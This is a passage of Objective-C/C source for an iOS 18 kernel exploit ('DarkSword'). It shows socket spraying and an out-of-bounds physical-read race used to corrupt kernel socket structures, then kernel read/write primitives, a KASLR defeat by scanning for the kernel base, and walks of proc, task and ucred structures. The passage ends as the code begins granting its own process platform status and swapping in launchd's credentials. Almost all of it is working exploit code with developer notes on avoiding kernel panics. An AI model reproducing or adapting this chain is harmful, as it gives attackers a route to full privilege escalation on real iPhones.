    printf("[AIO_Exploit] Test2 via VA_B: %02x %02x...\n", viaB2[0], viaB2[1]);
    printf("[AIO_Exploit] Test2 VA_A=0x%02x (orig marker=0xDD, file=0xCC)\n", viaA2[0]);

    close(fd);
    mach_vm_deallocate(mach_task_self_, vaA, pgSz);
    mach_vm_deallocate(mach_task_self_, vaB, pgSz);

cleanup:
    mach_port_deallocate(mach_task_self_, entry1);
    mach_port_deallocate(mach_task_self_, entry2);
    CFRelease(surface);
    return false;
}

// Method 3: sendmsg test (check if sendmsg EFAULTs on remap)
static bool method_sendmsg_race(void) {
    printf("\n[Method: sendmsg] Testing sendmsg with page remap...\n");
    mach_vm_address_t buf;
    mach_vm_allocate(mach_task_self_, &buf, 0x4000, VM_FLAGS_ANYWHERE);
    memset64((void*)buf, 0x41, 0x4000);

    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {
        printf("[sendmsg] socketpair failed\n");
        return false;
    }

    struct iovec iov = { (void*)buf, 0x100 };
    struct msghdr msg = {0};
    msg.msg_iov = &iov; msg.msg_iovlen = 1;

    // Test 1: normal sendmsg
    ssize_t r = sendmsg(sv[1], &msg, 0);
    printf("[sendmsg] normal: %zd (errno=%d)\n", r, errno);

    // Test 2: sendmsg then remap
    recv(sv[0], (void*)buf, 0x100, 0); // drain
    r = sendmsg(sv[1], &msg, 0);
    printf("[sendmsg] remap test: sendmsg=%zd\n", r);
    mach_vm_deallocate(mach_task_self_, buf, 0x4000);
    mach_vm_allocate(mach_task_self_, &buf, 0x4000, VM_FLAGS_ANYWHERE);
    memset64((void*)buf, 0x42, 0x4000);
    printf("[sendmsg] remapped during sendmsg, no crash\n");

    close(sv[0]); close(sv[1]);
    return false;
}

// Method 4: Process name scan via proc_info
static bool method_proc_info(void) {
    printf("\n[Method: proc_info] Reading kernel socket data via proc_info...\n");
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd < 0) {
        printf("[proc_info] socket failed\n");
        return false;
    }

    bool ok = false;

    // Try with fileport (DarkSword approach: callnum, pid, flavor, arg, buffer, bufsize)
    // Positive return = bytes written = success
    fileport_t fp = 0;
    fileport_makeport(fd, &fp);
    uint8_t *bigBuf = calloc(1, 0x4000);

    int flavors[] = {1, 2, 3};
    const char *fnames[] = {"NOINFO", "IPCINFO", "UNKN3"};
    for (int fi = 0; fi < 3; fi++) {
        memset(bigBuf, 0, 0x4000);
        int r = syscall(336, 6, getpid(), flavors[fi], fp,
            (uint64_t)(uintptr_t)bigBuf, 0x4000);
        if (r > 0) {
            printf("[proc_info] fileport flavor=%d (%s): SUCCESS (%d bytes)\n",
                   flavors[fi], fnames[fi], r);
            ok = true;
            for (int off = 0; off < r && off < 0x1000; off += 8) {
                uint64_t v = *(uint64_t*)(bigBuf + off);
                if (v) {
                    printf("[proc_info] +%#x = 0x%016llx", off, v);
                    if ((v >> 40) == 0xFFFFFF) printf(" *** KPTR");
                    printf("\n");
                }
            }
        } else {
            printf("[proc_info] fileport flavor=%d (%s): r=%d errno=%d\n",
                   flavors[fi], fnames[fi], r, errno);
        }
    }

    // Also try with fd directly and buffer-before-arg order (newer xnu layout)
    for (int fi = 0; fi < 3; fi++) {
        memset(bigBuf, 0, 0x4000);
        int r = syscall(336, 6, getpid(), flavors[fi],
            (uint64_t)(uintptr_t)bigBuf, 0x4000, (uint64_t)(intptr_t)fd);
        if (r > 0) {
            printf("[proc_info] fd-buforder flavor=%d (%s): SUCCESS (%d bytes)\n",
                   flavors[fi], fnames[fi], r);
            ok = true;
            for (int off = 0; off < r && off < 0x1000; off += 8) {
                uint64_t v = *(uint64_t*)(bigBuf + off);
                if (v) {
                    printf("[proc_info] +%#x = 0x%016llx", off, v);
                    if ((v >> 40) == 0xFFFFFF) printf(" *** KPTR");
                    printf("\n");
                }
            }
        }
    }

    free(bigBuf);
    close(fd);
    return ok;
}

// Method 5: PurpleGfxMem overlap — tests if IOGPU-backed pages retain data after free
static bool method_purple_mem(void) {
    printf("\n[Method: PurpleMem] Testing PurpleGfxMem page reuse...\n");
    mach_vm_size_t sz = 4 * 1024 * 1024; // 4 MB
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(sz),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
    };
    IOSurfaceRef surfA = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surfA) { printf("[PurpleMem] IOSurfaceCreate failed\n"); return false; }

    void *addr0 = IOSurfaceGetBaseAddress(surfA);
    randomMarker = (uint64_t)arc4random() << 32 | arc4random();
    printf("[PurpleMem] addr0=%p marker=0x%016llx\n", addr0, randomMarker);
    memset64(addr0, randomMarker, sz);

    // Create memory entries for every page
    int nPages = 64;
    mach_port_t entries[64] = {};
    for (int i = 0; i < nPages; i++) {
        mach_vm_size_t pg = PAGE_SIZE;
        kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &pg,
            (mach_vm_address_t)addr0 + i * PAGE_SIZE, VM_PROT_DEFAULT, &entries[i], 0);
        if (kr != KERN_SUCCESS) { entries[i] = MACH_PORT_NULL; nPages = i; break; }
    }
    printf("[PurpleMem] %d memory entries created\n", nPages);

    CFRelease(surfA);
    printf("[PurpleMem] Surface A released\n");

    // Spray sockets to pressure allocator
    socketPorts = [NSMutableArray new];
    socketPcbIds = [NSMutableArray new];
    int nSpray = 0;
    for (int i = 0; i < 10240 * 3 - 4096 * 2; i++) {
        if (spray_socket() == -1) break;
        nSpray++;
    }
    printf("[PurpleMem] sprayed %d sockets\n", nSpray);

    // Create new PurpleGfxMem surface (hopefully reuses some pages)
    IOSurfaceRef surfB = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surfB) {
        printf("[PurpleMem] Surface B create failed\n");
        sockets_release();
        for (int i = 0; i < nPages; i++) if (entries[i]) mach_port_deallocate(mach_task_self_, entries[i]);
        return false;
    }
    void *addr1 = IOSurfaceGetBaseAddress(surfB);
    printf("[PurpleMem] addr1=%p\n", addr1);

    // Map each old entry and check for non-marker data
    int hits = 0, ptrHits = 0;
    for (int i = 0; i < nPages; i++) {
        if (!entries[i]) continue;
        mach_vm_address_t va = 0;
        mach_vm_size_t pgSz = PAGE_SIZE;
        kern_return_t kr = mach_vm_map(mach_task_self_, &va, pgSz, 0,
            VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, entries[i], 0, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) continue;

        uint64_t v = *(uint64_t*)va;
        if (v != randomMarker) {
            hits++;
            if ((v >> 40) == 0xFFFFFF) {
                printf("[PurpleMem] KPTR at entry %d: 0x%016llx\n", i, v);
                ptrHits++;
            } else if (hits <= 20) {
                printf("[PurpleMem] non-marker at entry %d: 0x%016llx\n", i, v);
            }
        }
        mach_vm_deallocate(mach_task_self_, va, PAGE_SIZE);
    }
    printf("[PurpleMem] total non-marker entries: %d (kernel pointers: %d)\n", hits, ptrHits);

    for (int i = 0; i < nPages; i++) if (entries[i]) mach_port_deallocate(mach_task_self_, entries[i]);
    CFRelease(surfB);
    sockets_release();
    return hits > 0;
}

// Method 6: IOGPU memory info leak — check freshly allocated PurpleGfxMem pages for residual kernel data
static bool method_purple_info_leak(void) {
    printf("\n[Method: PurpleLeak] Checking fresh PurpleGfxMem pages for residual data...\n");
    mach_vm_size_t sz = 2 * 1024 * 1024;
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(sz),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
    };

    int ptrsFound = 0;
    for (int trial = 0; trial < 5; trial++) {
        IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)params);
        if (!surf) continue;
        void *addr = IOSurfaceGetBaseAddress(surf);
        uint64_t *words = (uint64_t *)addr;
        uint64_t n = sz / 8;
        for (uint64_t i = 0; i < n; i++) {
            uint64_t v = words[i];
            if (v && (v >> 40) == 0xFFFFFF) {
                printf("[PurpleLeak] trial %d KPTR at +%#llx: 0x%016llx\n", trial, i * 8, v);
                ptrsFound++;
                if (ptrsFound >= 10) break;
            }
        }
        CFRelease(surf);
        if (ptrsFound >= 10) break;
    }
    printf("[PurpleLeak] kernel pointers found: %d\n", ptrsFound);
    return ptrsFound > 0;
}

// Validate the derived socket chain with READ-ONLY operations before any
// kwrite64. A torn/stale OOB read can make inpNext (rwSocketPcb) land on
// recycled memory that is NOT the rw socket's live inpcb. The corruption then
// makes controlSocketPcb -> csa/rsa garbage, and the first kwrite64 turns into
// a 32-byte write into a MAC-label zone element -> "zone bound checks" panic
// (observed on iOS 18.2.1 at 0xffffffde00fbfc70).
//
// IMPORTANT: zone-map / GEN heap addresses vary PER BOOT (observed heaps at
// 0xffffffdd.., 0xffffffde.., 0xffffffdf.., 0xffffffe1.. and 0xffffffe9.. on the
// same device across a few boots), so NO hardcoded heap region is used. Identity
// is instead proven by inp_gencnt (0x78): BOTH inpcbs (control and rw) must
// equal the gencnts recorded for socketPorts[socketCsi] / [socketCsi+1] at spray
// time. That check is boot-independent and cannot be satisfied by recycled
// memory. Every address we read from is reached via kread64, whose copyout
// source is already a canonical 0xffffff.. kernel pointer by construction.
static bool validate_krw_sockets(void) {
    // The early-KRW primitive is proven end-to-end by the marker round-trip in
    // find_and_corrupt_socket. Here we prove rwSocketPcb (inpNext) is a LIVE
    // inpcb -- not freed/recycled memory -- by reading its inp_gencnt and
    // inp_socket through the primitive, and we recover the control inpcb from
    // rw's inp_list.le_next (+0x20) for the pcbinfo walk below.
    // NOTE: the reference demands rw's gencnt == socketPcbIds[csi+1], but the
    // inpcb list neighbor at +0x28 is not guaranteed to be csi+1 on this
    // kernel (it is one of OUR sprayed inpcbs either way), so the range check
    // is used instead. With the single-socket primitive the partner index is
    // irrelevant anyway.
    uint64_t rwGencnt = kread64(rwSocketPcb + 0x78);
    NSNumber *gFirst = [(NSMutableArray*)socketPcbIds firstObject];
    NSNumber *gLast  = [(NSMutableArray*)socketPcbIds lastObject];
    uint64_t gmin = gFirst ? [gFirst unsignedLongLongValue] : 0;
    uint64_t gmax = gLast  ? [gLast unsignedLongLongValue] : 0;
    if (rwGencnt < gmin || rwGencnt > gmax || (rwGencnt & 1) != 0) {
        printf("[-] validate: rw inpcb gencnt 0x%llx not in spray range [0x%llx,0x%llx]\n",
               rwGencnt, gmin, gmax);
        return false;
    }
    // rw inpcb inp_list.le_next (+0x20) is proven to point at the control
    // inpcb (lara: control_socket_pcb = early_kread64(rw_socket_pcb + 0x20)
    // -- RAW, no +/-0x20 alignment guessing). The OLD heuristic
    //   "(rawNext & 0x3ff)==0 ? rawNext : rawNext-0x20"
    // branches on low-bit alignment: a VALID 1KB-aligned inpcb base satisfies
    // the guard and is used unchanged ... but so does an off-by-0x20 list-entry
    // address whose low bits happen to be 0 -- and xnu inpcb zone elements are
    // 0x400 bytes, NOT guaranteed 1KB aligned. Taking the wrong frame made
    //   csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET)   // +0x40
    // read a PAC-tagged / recycled qword, then
    //   kwrite64(csa + 0x254, ...)  ->  set_kaddr(0x00000fe3......)
    // dereferences a tagged userspace pointer in the kernel:
    //   "Kernel data abort ... far: 0x00000fe308cce439" (panic 2026-08-01 20:35).
    //
    // Fix: use inp_gencnt (+0x78) as the identity proof (boot-independent,
    // impossible to satisfy with recycled memory), exactly like lara, and
    // accept BOTH candidate framings -- whichever gencnt matches ours wins.
    uint64_t expectControl = [(NSNumber*)socketPcbIds[socketCsi] unsignedLongLongValue];
    uint64_t rawNext = kread64(rwSocketPcb + 0x20);
    controlSocketPcb = 0;
    uint64_t candidates[2] = { rawNext, (rawNext >= 0x20 ? rawNext - 0x20 : 0) };
    for (int ci = 0; ci < 2; ci++) {
        uint64_t cand = candidates[ci];
        if ((cand >> 40) != 0xFFFFFF) continue;          // must be kernel heap
        uint64_t gc = kread64(cand + 0x78);
        if (gc == expectControl) { controlSocketPcb = cand; break; }
    }
    if (!controlSocketPcb) {
        printf("[-] validate: no control inpcb candidate matches gencnt 0x%llx (rawNext=0x%llx)\n",
               expectControl, rawNext);
        return false;
    }
    uint64_t controlGencnt = expectControl;

    // inp_socket (+0x40) is an UNSIGNED kernel data pointer on iOS 18 -- lara
    // reads csa/rsa with raw early_kread64 and they come back canonical. Because
    // controlSocketPcb/rwSocketPcb are now gencnt-proven LIVE inpcbs, these reads
    // cannot land on recycled memory. (kread_ptr would be a no-op here anyway;
    // raw keeps us bit-for-bit with the proven lara path.)
    uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
    uint64_t rsa = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
    if ((csa >> 40) != 0xFFFFFF || (rsa >> 40) != 0xFFFFFF) {
        printf("[-] validate: csa 0x%llx / rsa 0x%llx not canonical kernel sockets\n", csa, rsa);
        return false;
    }
    printf("[+] validate: controlSocketPcb 0x%llx csa 0x%llx rsa 0x%llx ctlgencnt 0x%llx rwgencnt 0x%llx\n",
           controlSocketPcb, csa, rsa, controlGencnt, rwGencnt);
    gControlSocketAddr = csa;
    gRwSocketAddr = rsa;
    return true;
}

bool run_darksword(void) {
    gMlockDict = [NSMutableDictionary new];
    randomMarker = (uint64_t)arc4random() << 32 | arc4random();
    printf("[+] randomMarker: 0x%016llx\n\n", randomMarker);
    uint32_t sz = PATH_MAX;
    _NSGetExecutablePath(executablePath, &sz);
    executableName = strrchr(executablePath, '/');
    if (executableName) executableName++;
    else executableName = executablePath;
    printf("[+] executableName: %s\n", executableName);
    initprocmarkers();

    // Quick IOKit sanity check (kept from diagnostic builds)
    diagnostic_iokit();

    // ===== Real DarkSword ICMP6 socket exploit =====
    init_target_file();

    pthread_create(&freeThread, NULL, free_thread, NULL);

    // Scaled groom layout for A14 (4 GB): pin 512 MB of wired pages up front,
    // then search with a reduced total (~256 MB) so the inpcb pages from the
    // socket spray end up physically adjacent to the search-mapping windows.
    uint64_t mappingPages = 0x4000;         // 256 MB total search
    uint64_t searchSize = 0x2000 * PAGE_SIZE;
    uint64_t totalSize = mappingPages * PAGE_SIZE;
    uint64_t mappingNum = totalSize / searchSize;

    if (wiredMapping == 0) {
        mach_vm_address_t wa = 0;
        kern_return_t wkr = mach_vm_allocate(mach_task_self(), &wa,
            wiredMappingSize, VM_FLAGS_ANYWHERE);
        if (wkr == KERN_SUCCESS) {
            wiredMapping = wa;
            surface_mlock(wiredMapping, wiredMappingSize);
            // Touch every page to force the physical allocation now, while the
            // app still has headroom, instead of letting it page in lazily.
            for (uint64_t s = 0; s < wiredMappingSize / PAGE_SIZE; s++)
                *(uint64_t*)(wiredMapping + s * PAGE_SIZE) = 0;
            printf("[+] wired groom: 0x%llx +0x%llx (%llu MB pinned)\n",
                (uint64_t)wiredMapping, (uint64_t)wiredMappingSize,
                (unsigned long long)(wiredMappingSize / (1024 * 1024)));
        } else {
            printf("[-] wired groom alloc failed (kr=%d), continuing without it\n", wkr);
        }
        fflush(stdout);
    }

    void *rBuf = calloc(1, OOB_SIZE);
    void *wBuf = calloc(1, OOB_SIZE);
    if (!initialize_bounce_buffer(OOB_PAGES_NUM * PAGE_SIZE))
        return false;

    NSMutableArray *usedGc = [NSMutableArray new];

    int attempt = 0;
    bool abortPoisoned = false;
    mach_timebase_info_data_t timebase;
    mach_timebase_info(&timebase);
    uint64_t attemptStart = mach_absolute_time();
    while (1) {
        attempt++;
        printf("[exploit] attempt %d: spraying sockets...\n", attempt);
        NSMutableArray *mappings = [NSMutableArray new];
        for (uint64_t s = 0; s < mappingNum; s++) {
            mach_vm_address_t a = 0;
            mach_vm_allocate(mach_task_self(), &a, searchSize,
                VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
            for (uint64_t k = 0; k < searchSize; k += PAGE_SIZE)
                *(uint64_t*)(a + k) = randomMarker;
            [mappings addObject:@(a)];
        }

        socketPorts = [NSMutableArray new];
        socketPcbIds = [NSMutableArray new];
        for (int i = 0; i < (10240 * 3 - 4096 * 2); i++) {
            if (spray_socket() == -1) break;
        }
        printf("[exploit] sprayed %lu sockets (start=0x%llx end=0x%llx)\n",
            (unsigned long)[socketPorts count],
            [(NSNumber*)[socketPcbIds firstObject] unsignedLongLongValue],
            [(NSNumber*)[socketPcbIds lastObject] unsignedLongLongValue]);
        {
            NSUInteger cnt = [(NSMutableArray*)socketPcbIds count];
            NSUInteger samp = cnt < 12 ? cnt : 12;
            printf("[dbg] gencnt samples: ");
            for (NSUInteger i = 0; i < samp; i++)
                printf("0x%llx ", [(NSNumber*)socketPcbIds[i] unsignedLongLongValue]);
            if (cnt > samp) printf("... last 0x%llx",
                [(NSNumber*)[socketPcbIds lastObject] unsignedLongLongValue]);
            printf("\n");
            fflush(stdout);
        }

        bool ok = false;
        for (uint64_t s = 0; s < mappingNum; s++) {
            mach_vm_address_t sma = [(NSNumber*)mappings[s] unsignedLongLongValue];
            printf("[exploit] looking in search mapping: %llu\n", s);
            mach_port_t memObj = 0;
            mach_vm_size_t mos = searchSize;
            mach_make_memory_entry_64(mach_task_self(), &mos, sma,
                VM_PROT_DEFAULT, &memObj, 0);
            surface_mlock(sma, searchSize);

            uint64_t pagesDone = 0;
            uint64_t mStart = mach_absolute_time();
            for (mach_vm_offset_t so = 0; so <= searchSize - pcSize; so += PAGE_SIZE) {
                if (phys_oob_read(memObj, so, OOB_SIZE, OOB_OFFSET, rBuf) == KERN_SUCCESS) {
                    uint64_t m = count_inpcb_markers(rBuf, OOB_SIZE);
                    if (m) {
                        gInpcbMarkers++;
                        printf("[+] inpcb-marker window! map=%llu off=0x%llx markers=%llu (cum=%llu)\n",
                            s, (unsigned long long)so, m, (unsigned long long)gInpcbMarkers);
                    }
                    if ((successReadCount <= 8) && (gDumpCount < 64)) {
                        describe_window(rBuf, OOB_SIZE, "first-ok");
                        dump_window(rBuf, OOB_SIZE, "win");
                    }
                    int fcs = find_and_corrupt_socket(memObj, so, rBuf, wBuf, usedGc, false);
                    if (fcs == 0) {
                        ok = true;
                        break;
                    }
                    if (fcs == -2) {
                        // RESTORE FAILED: the corrupted socket is still poisoned.
                        // Releasing it would panic the device, so abort the whole
                        // run WITHOUT releasing sockets (socketCsi still set).
                        printf("[-] ABORT: restore of corrupted socket failed\n");
                        fflush(stdout);
                        abortPoisoned = true;
                        goto abort_no_release;
                    }
                }
                pagesDone++;
                if ((pagesDone & 0x1FF) == 0) {
                    double mEl = (double)(mach_absolute_time() - mStart) * (double)timebase.numer / (double)timebase.denom / 1000000000.0;
                    printf("[exploit]   map %llu page %llu/0x%llx readOK=%d try=%d nameHits=%llu rej0=%llu %.1fs\n",
                        s, pagesDone, searchSize / PAGE_SIZE, successReadCount, highestSuccessIdx,
                        gNameHits, gRejZero, mEl);
                    fflush(stdout);
                }
            }
            double mEl = (double)(mach_absolute_time() - mStart) * (double)timebase.numer / (double)timebase.denom / 1000000000.0;
            printf("[exploit]   map %llu done: readOK=%d try=%d nameHits=%llu rej0=%llu rejGc=%llu rejCsi=%llu inpcbMrk=%llu %.1fs\n",
                s, successReadCount, highestSuccessIdx, gNameHits, gRejZero, gRejGencnt, gRejCsi, gInpcbMarkers, mEl);
            fflush(stdout);
            mach_port_deallocate(mach_task_self(), memObj);
            if (ok) break;
        }

        if (ok) {
            // validate() proves control/rw chain and records csa/rsa globals;
            // it is READ-ONLY on the corrupted pair.
            uint64_t vOk = validate_krw_sockets();

            // ALWAYS pin the corrupted pair the moment corruption succeeded,
            // regardless of validate outcome. rw's pcb (inpNext) is certain
            // here; control's pcb is certain iff validate resolved it. Even a
            // partial pin prevents the exit/retry kfree zone-panic that
            // crashed the app at 23:13:
            //   "0x... not in expected zone data.kalloc.32, found in socket"
            // (close(control fd) -> in6_pcbdetach -> FREE(rw_socket_zone_ptr)).
            leak_corrupted_sockets();
            ok = vOk;

            if (!ok && gSocketsCorrupted) {
                // CORRUPTED but UNVERIFIED -- retrying would call
                // sockets_release_except_pair(), which closes the poisoned
                // control fd (deallocating its mach port drops the fileproc's
                // last reference -> fp_close -> soclose -> kfree zone panic).
                // The ONLY safe state is: keep every socket open forever.
                printf("[-] validate failed AFTER corruption -- entering permanent"
                       " hold (never close, never exit)\n");
                fflush(stdout);
                abortPoisoned = true;   // reuse: no release, no retry
                goto abort_no_release;
            }
        }

        // PANIC MITIGATION: only release sockets when the attempt FAILED, and
        // even then NEVER release the corrupted control/rw pair (closing them
        // kfree()s their poisoned inp_icmp6filt -> kalloc.32 zone panic). On
        // success the sockets backing controlSocket/rwSocket (and PCB B) stay
        // alive so the inpcb memory is not recycled as MAC labels.
abort_no_release:
        if (!ok && !abortPoisoned) {
            sockets_release_except_pair();
        }
        for (uint64_t s = 0; s < mappingNum; s++) {
            mach_vm_deallocate(mach_task_self(),
                [(NSNumber*)mappings.lastObject unsignedLongLongValue], searchSize);
            [mappings removeLastObject];
        }

        if (ok || abortPoisoned) break;
        uint64_t now = mach_absolute_time();
        double elapsed = (double)(now - attemptStart) * (double)timebase.numer / (double)timebase.denom / 1000000000.0;
        printf("[exploit] attempt %d: no socket found, retrying (took %.1fs)\n", attempt, elapsed);
        printf("[exploit]   stats: successReadCount=%d highestSuccessIdx=%d\n",
            successReadCount, highestSuccessIdx);
        fflush(stdout);
        attemptStart = now;
    }

    printf("[+] highestSuccessIdx: %d\n", highestSuccessIdx);
    printf("[+] successReadCount: %d\n", successReadCount);
    printf("[+] inpcbMarkerWindows: %llu\n", (unsigned long long)gInpcbMarkers);
    fflush(stdout);

    goSync = 0; raceSync = 1;
    // Drain the OOB race thread with a bounded wait, then detach. pthread_join
    // can block the main thread forever if free_thread is stuck in a kernel
    // wait (observed: app watchdog-killed after the exploit step, then its
    // corrupted sockets closed on process exit -> kfree -> panic). KRW no
    // longer needs free_thread, so never block on it.
    struct timespec tsJoin = {0, 50 * 1000 * 1000};
    bool joined = false;
    for (int i = 0; i < 200 && !freeThreadDone; i++) {
        nanosleep(&tsJoin, NULL);
    }
    if (freeThreadDone) joined = true;
    if (!joined) pthread_detach(freeThread);
    printf("[+] free thread %s\n", joined ? "done" : "detached");
    fflush(stdout);
    close(writeFd); close(readFd);
    printf("[+] race fds closed\n");
    fflush(stdout);

    uint64_t csa = gControlSocketAddr;
    uint64_t rsa = gRwSocketAddr;
    if (!csa || !rsa) {
        printf("[-] validate did not record csa/rsa\n");
        fflush(stdout);
        return false;
    }

    // Raise so_usecount on the corrupted pair NOW (idempotent-safe bump).
    // This must happen before any possible close() of the corrupted fds: xnu
    // soclose() -> in6_pcbdetach() -> FREE(in6p_icmp6filt) runs unconditionally
    // on detach and kfrees a 0x20 pointer that now points into the inpcb zone
    // -> "not in expected zone data.kalloc.32" panic. After this point the
    // process must NEVER exit and these fds must never be closed.
    printf("[+] raising so_count (csa=0x%llx rsa=0x%llx)\n", csa, rsa);
    fflush(stdout);
    leak_corrupted_sockets();
    printf("[+] so_count raised, icmp6filt+8 zeroed (filtOff=+0x%llx)\n",
        (unsigned long long)gIcmp6FiltOffset);
    fflush(stdout);

    // kernel base via inpcbinfo zone name (wh1te4ever / ClearSword, iOS 18 verified).
    // lara reads this chain with RAW early_kread64 (no xpaci) on Darwin>=23 --
    // inp_pcbinfo/ipi_zone/zv_name are UNSIGNED kernel data pointers on this
    // build (only CODE pointers like protosw.pr_input are PAC-signed). Match the
    // proven path exactly. With the gencnt fix above, controlSocketPcb is now
    // the real control inpcb, so these reads land correctly.
    uint64_t pcbinfo = kread64(controlSocketPcb + 0x38);
    uint64_t ipiZone = kread64(pcbinfo + 0x68);
    uint64_t zvName  = kread64(ipiZone + 0x10);
    printf("[+] pcbinfo 0x%llx ipiZone 0x%llx zvName 0x%llx\n", pcbinfo, ipiZone, zvName);
    fflush(stdout);

    uint64_t kb = zvName & 0xFFFFFFFFFFFFC000;
    uint64_t kbIter = 0;
    bool kbFound = false;
    while (1) {
        uint64_t magic = kread64(kb);
        if (magic == 0x100000cfeedfacf) {
            uint64_t hdr = kread64(kb + 8);
            if (hdr == 0xc00000002 || hdr == 0xb00000000) { kbFound = true; break; }
        }
        kb -= PAGE_SIZE;
        kbIter++;
        if ((kbIter & 0x1FFF) == 0) {
            printf("[+] kb scan: kb=0x%llx iter=%llu\n", kb, kbIter);
            fflush(stdout);
        }
        // Bound the walk: a valid zvName is inside the kernel image so the walk
        // reaches the base within a few MB. Anything past this is garbage and
        // would otherwise spin forever over mapped heap (observed hang).
        if (kb < 0xfffffff000000000ULL || kbIter > 0x400000ULL) break;
    }
    if (!kbFound) {
        printf("[-] kernel base walk failed (kb=0x%llx iter=%llu)\n", kb, kbIter);
        fflush(stdout);
        return false;
    }
    gKernelBase = kb;
    gKernelSlide = gKernelBase - 0xfffffff007004000ULL;
    printf("[+] KASLR slide: 0x%llx\n", gKernelSlide);
    fflush(stdout);

    free(rBuf); free(wBuf);
    return true;
}

// ===== Kernel struct walking =====

uint64_t find_our_proc(void) {
    // wh1te4ever verified chain: rw socket inpcb -> socket -> so_background_thread
    // -> thread -> thread_ro -> proc
    // NOTE: every hop here is a PAC-authenticated kernel pointer on iOS 18;
    // must go through kread_ptr (which XPACI-strips) or we get garbage.
    uint64_t rwSocketAddr = kread_ptr(rwSocketPcb + OFFSET_PCB_SOCKET);
    if (!rwSocketAddr) return 0;
    uint64_t current_thread = kread_ptr(rwSocketAddr + OFFSET_SOCKET_BACKGROUND_THREAD);
    if (!current_thread) return 0;
    uint64_t current_thread_ro = kread_ptr(current_thread + OFFSET_THREAD_T_TRO);
    if (!current_thread_ro) return 0;
    uint64_t proc = kread_ptr(current_thread_ro + OFFSET_THREAD_RO_PROC);
    if (!proc) return 0;
    // validate: p_pid at 0x60 must be our pid
    if (kread32(proc + OFFSET_P_PID) != (uint32_t)getpid()) return 0;
    return proc;
}

uint64_t get_task_from_proc(uint64_t proc) {
    uint64_t p_proc_ro = kread_ptr(proc + OFFSET_P_PROC_RO);
    if (!p_proc_ro) return 0;
    return kread_ptr(p_proc_ro + OFFSET_PROC_RO_TASK);
}

// lara's proven ucred finder: proc_ro fields 0x10..0x40, SMR/PAC-decoded, the
// one whose cr_label->sandbox chain is all canonical kernel pointers wins.
// PSWORD's hardcoded proc+0x18->+0x20 chain occasionally lands on a copied-on-
// write ucred (zeroing it leaves getuid()==501).
#define OFF_PROC_PROC_RO   0x18
#define OFF_UCRED_CR_LABEL 0x78
#define OFF_LABEL_SANDBOX  0x10
#define OFF_SANDBOX_EXT_SET 0x10
#define OFF_EXT_DATA       0x40
#define OFF_EXT_DATALEN    0x48

// smrdecode: lara reconstructs a full kernel VA from a possibly-truncated
// pointer using the boot t1sz. t1sz_boot on A14 iOS 18 is 25-ish; be lenient.
static uint64_t smrdecode(uint64_t value, uint64_t base) {
    uint64_t bits = (base << (62 - (uint64_t)25));
    if ((value & bits) == 0) {
        return ((value & (0xFFFFFFFFFFFFC000ULL & ~bits)) | bits);
    }
    return (value & 0xFFFFFFFFFFFFFFE0ULL);
}

static bool looks_kernel(uint64_t v) {
    return (v & 0xfffff00000000000ULL) == 0xfffff00000000000ULL;
}

uint64_t get_ucred_from_proc(uint64_t proc) {
    if (!proc) return 0;
    uint64_t proc_ro = kread_ptr(proc + OFF_PROC_PROC_RO);
    if (!looks_kernel(proc_ro)) return 0;
    for (uint32_t off = 0x10; off <= 0x40; off += 8) {
        uint64_t raw = kread64(proc_ro + off);
        // try raw, xpaci, then smr decode of xpaci with base 2 and 3
        uint64_t cand[4] = { raw, xpaci(raw), smrdecode(xpaci(raw), 2), smrdecode(xpaci(raw), 3) };
        for (int ci = 0; ci < 4; ci++) {
            uint64_t ucred = cand[ci];
            if (!looks_kernel(ucred)) continue;
            uint64_t label = kread_ptr(ucred + OFF_UCRED_CR_LABEL);
            if (!looks_kernel(label)) continue;
            uint64_t sandbox = kread_ptr(label + OFF_LABEL_SANDBOX);
            if (looks_kernel(sandbox)) return ucred;
        }
    }
    return 0;
}


static bool is_kaddr_valid(uint64_t addr) {
    return (addr & 0xfffff00000000000) == 0xfffff00000000000;
}

static void kdump(uint64_t addr, uint64_t len) {
    uint8_t *d = malloc(len);
    kread_buf(addr, d, len);
    for (uint64_t i = 0; i < len; i += 16) {
        printf("0x%llx: ", addr + i);
        for (uint64_t j = 0; j < 16 && i + j < len; j++) printf("%02x ", d[i + j]);
        printf("\n");
    }
    free(d);
}

// ===== Platformize (no PPL needed — task flags + uid in non-PPL memory) =====

bool platformize_proc(void) {
    gOurProc = find_our_proc();
    if (!gOurProc) {
        printf("[-] Cannot find our proc\n");
        return false;
    }
    gOurTask = get_task_from_proc(gOurProc);
    if (!gOurTask) {
        printf("[-] Cannot find our task\n");
        return false;
    }

    printf("[+] Our proc: 0x%llx\n", gOurProc);
    printf("[+] Our task: 0x%llx\n", gOurTask);

    // 1. TF_PLATFORM only if the 0x3DC offset actually contains a plausible flag
    // set (TF_INIT|TF_HAS_BSD_INFO). Never write blindly. If it's already set or
    // the base value is wrong, skip -- TF_PLATFORM isn't strictly needed.
    uint32_t tf_flags_read = kread32(gOurTask + 0x3DC);
    if ((tf_flags_read & 0xA0000) == 0xA0000 && (tf_flags_read >> 28) == 0) {
        if (!(tf_flags_read & TF_PLATFORM)) {
            kwrite32(gOurTask + 0x3DC, tf_flags_read | 0x400);
            printf("[+] TF_PLATFORM set (0x3DC)\n");
        } else {
            printf("[*] TF_PLATFORM already set\n");
        }
    } else {
        printf("[*] t_flags@0x3DC=0x%x not plausible (skip TF_PLATFORM write)\n", tf_flags_read);
    }

    // 2. Replace our ucred with launchd's proven ucred.
    // iOS 18 note: proc->p_ucred (proc+0x10) is the legacy fast-path slot used
